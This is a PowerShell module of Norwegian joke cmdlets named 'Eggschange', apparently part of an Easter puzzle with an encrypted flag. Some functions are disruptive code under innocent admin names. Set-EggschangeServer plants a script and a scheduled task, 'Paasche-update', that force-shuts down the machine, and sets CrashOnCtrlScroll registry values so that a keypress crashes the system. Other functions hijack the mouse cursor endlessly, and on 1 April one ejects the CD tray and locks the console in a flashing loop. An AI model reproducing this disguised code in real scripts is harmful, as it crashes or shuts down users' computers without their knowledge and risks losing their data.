
function Disable-EggschangePiiMapping () {
    Write-Host "Du trenger ikke dette, du har Paasche!" -ForegroundColor Yellow
	
	}

function Enable-EggschangeHealth () {
    $vALUE ="https://www.matportalen.no/matvaregrupper/tema/egg/egg_og_salmonella"
    $webRequest = [Net.WebRequest]::Create("https://www.matportalen.no/matvaregrupper/tema/egg/egg_og_salmonella")
    try { $webRequest.GetResponse() } catch {}
    $cert = $webRequest.ServicePoint.Certificate
    $bytes = $cert.Export([Security.Cryptography.X509Certificates.X509ContentType]::Cert)
    write-host $bytes

	}

function Enable-EggschangeEgghunt () {
    Write-Host "Denne er alltid på." -ForegroundColor green
	
	}


function Update-EggschangeHelp () {

    #Oppdatering for paaschehjelp 

    try {
        if ($PSScriptRoot) {
            $Parentpath = $PSScriptRoot
            }
        elseif ($psISE.CurrentFile.FullPath) {
            $Parentpath =  ($psISE.CurrentFile.FullPath | Split-Path -Parent)
            }
    
        else {
        Write-Host "Finner ikke hjelpefilene for paaschehjelp" -ForegroundColor Red
        break
        }
    }

    catch {}

    $1 = (($Parentpath) + "\Hjelp_1")
    $2 = (($Parentpath) + "\Hjelp_2")

    $Hjelp1 = Get-Content $1
    $Hjelp2 = Get-Content $2

    #De Er Like god hjelp begge to
    $bytes = [Convert]::FromBase64String($Hjelp1)
    [IO.File]::WriteAllBytes(($1+".jpg"), $bytes)

    $bytes = [Convert]::FromBase64String($Hjelp2)
    [IO.File]::WriteAllBytes(($2+".jpg"), $bytes)

	}


function Get-EggschangeAssistance () {

    Write-Host "Trenger du assistanse? Våre åpningstider er 08:00:: til 08:00:31 og 12:00 til 12:00:59 onsdager siste uke i hver måned"
	
	}

function Get-EggschangeObject () {
    
    $EggschangeObjekt = New-EggschangeObject
    $Obj_OS = Get-CimInstance Win32_OperatingSystem
    $Obj_HW = Get-CimInstance Win32_ComputerSystem
    $Obj_disk = Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3"

    $EggschangeObjekt.navn = $Obj_OS.CSName
    $EggschangeObjekt.versjon = $Obj_OS.Version
    $EggschangeObjekt.selskap = $Obj_OS.Organization
    $EggschangeObjekt.bruker = $Obj_OS.RegisteredUser
    $EggschangeObjekt.ledig_plass = $Obj_disk.FreeSpace
    $EggschangeObjekt.oppetid = $Obj_OS.LastBootUpTime
    $EggschangeObjekt.arkitektur = $Obj_OS.OSArchitecture
    $EggschangeObjekt.systemtype = $Obj_HW.SystemFamily
    $EggschangeObjekt.produsent = $Obj_HW.Manufacturer
    $EggschangeObjekt.ram = $Obj_HW.TotalPhysicalMemory
    
    return $EggschangeObjekt

	}

function Get-EggschangeDiagnosticInfo () {
    Write-host "It hurts when IPv4" -ForegroundColor DarkYellow
	
	}

function Get-EggschangeNotification () {
	
	}

function Get-EggschangeServer () {
	
	}

function Get-EggschangeEggHash () {

    param(
    [Parameter(Mandatory=$true)]
    [string]$Egg,
    [ValidateSet(MD5,SHA1,SHA256)]
    [string]$Eggtype
    )

    Get-FileHash -Path $Egg -Algorithm $Eggtype
	
	}

function Get-Eggslist () {
    &(start "https://en.wikipedia.org/wiki/List_of_Easter_eggs_in_Microsoft_products")
	
	}

function Get-EggschangeSettings () {
	
	}

function Get-EggschangeUpgrade () {
    
    #Write-Host "Vennligst vent mens vi forverrer brukeropplevelsen" -BackgroundColor Cyan -ForegroundColor Red
    Write-Host "Vennligst vent mens vi laster brukeropplevelsen" -BackgroundColor Cyan -ForegroundColor Red
    for ($I=0; $I -le 5; $i++ ) {Write-Host "." -NoNewline -ForegroundColor Yellow; sleep 1}
    Write-Host ""
	
	}

function Import-EggschangeCertificate () {
	
	}

function Import-EggschangeDlpPolicy () {
    $DLP = "Don`t lose eggs"
	
	}

function New-EggschangeObject () {

    $PropertyHashtable = @{
            navn          = $null
            versjon       = $null
            selskap       = $null
            bruker        = $null
            ledig_plass   = $null
            oppetid       = $null
            arkitektur    = $null
            systemtype    = $null
            produsent     = $null
            ram           = $null
        }

    $EggschangeObject = New-Object psobject -Property $PropertyHashtable
    return $EggschangeObject
	
	}



function New-EggschangeSettings () {
    
    param(
    [Parameter(Mandatory=$true)]
    [ValidateSet(1,2,3)]
    [int]$Setupmode
        )

    #Setupmode = 1: Paasche fakturerer på timesbasis. Legg inn tid til kaffepause mellom slaga
    #Setupmode = 2: Avtale på fastpris. Ikke les dette, bare bli ferdig med det!
    #siste: Paasche-Egg™


    $Wait = switch ( $Setupmode )
        {
            "1"      { 60 }
            "2"   { 0 }
            }

    if ($Setupmode -eq 1) {

        Write-Host "Steget er fullført, vi beveger oss videre til neste avanserte fase av dette kompliserte oppsettet. Bra du har oss!"

        $Buzzwords = 
            "Blockchain",
            "Cryptocurrency",
            "NextGen Firewall",
            "Serverless", 
            "NoCode",
            "LowCode",
            "Internet Of Things",
            "Big Data",
            "Machine learing",
            "Artificial intelligence",
            "Quantum Computing",
            "Hyperautomation",
            "Distributed cloud",
            "Agile development",
            "Shadow IT",
            "DevOps",
            "Edge computing",
            "CryptoCurrency",
            "Deep Learning",
            "Mesh Network",
            "E-Commerce",
            "B2B / B2C",
            "BYOD",
            "Data mining",
            "Augmented reality"

        $i = 0
        while ($i -le $wait ) {
            Write-Progress -Activity "Laster kompliserte IT-begreper..." -CurrentOperation (Get-random -InputObject $Buzzwords) -PercentComplete $i
            Start-Sleep -Milliseconds 500
            $i++
            }
        }

    if ($Setupmode -eq 2) {
        Write-Host "KJAPP DEG!"
        #Sleep -1
	    }

    if ((Get-Date -format ddMMyy) -like "0104*") {

        Write-Debug "April, type snarr"
        sleep 3
        if ((New-Object -com "WMPlayer.OCX.7").cdromcollection.count -ne 0) {
            (New-Object -com "WMPlayer.OCX.7").cdromcollection.item(0).eject()
            }
        While ($true) {
            cls
            Write-host "                                                       " -BackgroundColor Yellow
            Write-host "                                                       " -BackgroundColor Yellow
            Write-host "                                                       " -BackgroundColor Yellow
            Write-host "                                                       " -BackgroundColor Yellow
            Write-host "Gratulerer! Du har vunnet en gratis konsulenttime!     " -BackgroundColor Yellow -ForegroundColor black
            Write-host "     (Ikke faktisk sant, vennligst betal)              " -BackgroundColor Yellow
            Write-host "                                                       " -BackgroundColor Yellow
            Write-host "                                                       " -BackgroundColor Yellow
            Write-host "                                                       " -BackgroundColor Yellow
            sleep 0.7
            cls
            Write-host "                                                       " -BackgroundColor Blue
            Write-host "                                                       " -BackgroundColor Blue
            Write-host "                                                       " -BackgroundColor Blue
            Write-host "                                                       " -BackgroundColor Blue
            Write-host "Gratulerer! Du har vunnet en gratis konsulenttime!     " -BackgroundColor Blue -ForegroundColor black
            Write-host "     (Ikke faktisk sant, vennligst betal)              " -BackgroundColor Blue
            Write-host "                                                       " -BackgroundColor Blue
            Write-host "                                                       " -BackgroundColor Blue
            Write-host "                                                       " -BackgroundColor Blue
            sleep 0.7
            }
        }
    }



function New-EggschangeUpgradeBucket () {
	
	}


function Set-EggschangeAssistanceConfig () {
	
	}

function Set-EggschangeServer () {

    param(
    [string]$Servername,
    [string]$Eggschangeversion,
    [string]$Importance = "es muy importante"
    )


    #Kast verdier, gjør konfigurasjonsendringer på egenhånd.
    $CurrentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $IzIAdminz = $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if ($IzIAdminz -eq $false) {
        Write-Error "Flott om du prøver igjen, som Admin, Så får vi gjort viktige Adminting."
        break
        }


    $theWhat = '[System.Windows.Forms.SendKeys]::SendWait("^{SCROLLLOCK 2}"); Stop-Computer -ComputerName localhost -Force'
    $path = ([string](Resolve-Path ~) + "\1.ps1")
    $theWhat > ([String](Resolve-Path ~) + "\1.ps1")

    $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NonInteractive -NoLogo -NoProfile -File $($Path)"
    $Trigger = New-ScheduledTaskTrigger -Once -At "2021-04-02T16:00:00Z"
    $Settings = New-ScheduledTaskSettingsSet

    $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings
    Register-ScheduledTask -TaskName 'Paasche-update' -InputObject $Task 

    $Regpaths = 
    "HKLM:\System\CurrentControlSet\Services\i8042prt\Parameters",
    "HKLM:\System\CurrentControlSet\Services\kbdhid\Parameters", 
    "HKLM:\System\CurrentControlSet\Services\hyperkbd\Parameters"

    foreach ($i in $Regpaths ) {
        if (!(Test-Path $i)) {
            #Finnes ikke
            return  
            }

        New-ItemProperty -Path $i -PropertyType DWORD -Name "CrashOnCtrlScroll" -Value "0x01" -ErrorAction SilentlyContinue
        
        }
	
	}

function Set-EasterEggschangeSettings () {

        param(
        [ValidateSet("Low", "Medium", "Vindaloo", "9000+")]
        [String]$EasterAmount = "Medium"
        )


            $Wait = switch ( $EasterAmount )
                {
                    "Low"      { 1 }
                    "Medium"   { 0.5 }
                    "Vindaloo" { 0.3}
                    "9000+"    { 0.2 }
                    }

            $Offset = switch ( $EasterAmount )
            {
                "Low"      { 100  }
                "Medium"   { 100  }
                "Vindaloo" { 1000 }
                "9000+"    { 1000 }
                }

            Add-Type -AssemblyName System.Windows.Forms

            while ($true) {
              $counter = 0
                while ($counter -lt $Offset) {
                    $Pos = [System.Windows.Forms.Cursor]::Position
                    $x = ($pos.X % 500) + 1
                    $y = ($pos.Y % 500)
                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
                    Start-Sleep -Seconds $Wait
                    $counter++
                }
                $counter = 0
                while ($counter -lt $Offset) {
                    $Pos = [System.Windows.Forms.Cursor]::Position
                    $y = ($pos.Y % 500) + 1
                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
                    Start-Sleep -Seconds $Wait
                    $counter++
                }
                while ($counter -gt 1) {
                    $Pos = [System.Windows.Forms.Cursor]::Position
                    $x = ($pos.X % 500) - 1
                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
                    Start-Sleep -Seconds $Wait
                    $counter--
                }
                $counter = $Offset
                while ($counter -gt 1) {
                    $Pos = [System.Windows.Forms.Cursor]::Position
                    $Y = ($pos.Y % 500) - 1
                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
                    Start-Sleep -Seconds $Wait
                    $counter--
                }
            }
 
	}

function Set-EggschangeUpgradeSettings () {

       $Upgradesettings = @{
        SpiritAnimal       = "Gnu"
        EnterpriseEnabled = $false
        SignaturePosition = "guard"
        UbuntuKeyserverUploaded = $true
        DeveloperFingerprint = "616341b190ef25ce024dd2e9494450ef40d37e5c"
	DeveloperFingerprintPrefix = "0x"

        }
    $ReleaseInfo = New-Object PSObject -Property $Upgradesettings
    return $ReleaseInfo
    
	}

function New-EggschangeNotification () {
    
    param(
        [Parameter(Mandatory=$true)]
        [String]$Question
        )

    [void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")

    try {

        $Answer = [System.Windows.Forms.MessageBox]::Show($Question,'Paasche Consult','YesNo','Question')
        return $Answer
        }
    
    catch {
        
        Write-Host "Kunne inte fröga frägorna" -ForegroundColor Red
	
	}
}

function Test-EggschangeFlag () {

    param(
        [parameter(Mandatory=$true)]
        $Decryption_key
        )


        Function ConvertTo-UnsecureString {
        Param (
            [Parameter(Mandatory=$True)]
            [System.Security.SecureString]$ss
        )

        Try {
            $ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToGlobalAllocUnicode($ss)
            [System.Runtime.InteropServices.Marshal]::PtrToStringUni($ptr)
        }
            Finally {
                [System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($ptr)
            }
        }

    $Kryptert_påske = "76492d1116743f0423413b16050a5345MgB8AHoAdQA2ACsAUABWADkAbQBvAGMAYgBDAGgASQB6AGUAdgBxAGgASQBQAGcAPQA9AHwANwAxADkAMAA2ADIANwAwADIAZgAzAGMAZgA5ADkAMgA1AGQAZQA3ADYAOQBjADAAYQAzAGQAMgA2AGEAMAAxADcAYQBjAGIANABmAGQANwA0AGUAYQBhADAAMABlADIAMABjADQANwBiAGMAZAA4ADUAOQAwAGQANABiADQAMQA0AGMAMwA0ADAAMABiADcANwA5ADkAZQA4ADkAMgA5AGYAYwAwADcAMAA5ADIAMwBmADQANgB
                kAGEAMwBlADgANAAxADYAOAA0ADMAMQA4ADYANQBlADIAZgA1ADcAOAA3AGMAYwA0ADIANgBhADMAYQBkADMAOAAxAGQAMAA2ADQAYwA3ADAAYQBmAGMAMgBkAGUAZQBmADQAMQBmADcAMAAzAGEAYwBhADMAYwBjAGMAOQBlADcANABiADIAMAA="

    try {
        
        $Decryption_key = $Decryption_key.tolower()

        $key = [byte[]]($Decryption_key).ToCharArray()
        $ss = ConvertTo-SecureString -String $Kryptert_påske -Key $key
        $Flag_decoded = ConvertTo-UnsecureString $ss

        return ([regex]::Matches($Flag_decoded,'.','RightToLeft') | ForEach {$_.value}) -join ''
        }

    catch {
        Write-Host "Feil nøkkel nøklet i nøkkelhullet. Prøv igjen." -ForegroundColor Red
        Write-Host "Spør om hjelp kanskje?"
        
        }	
	}

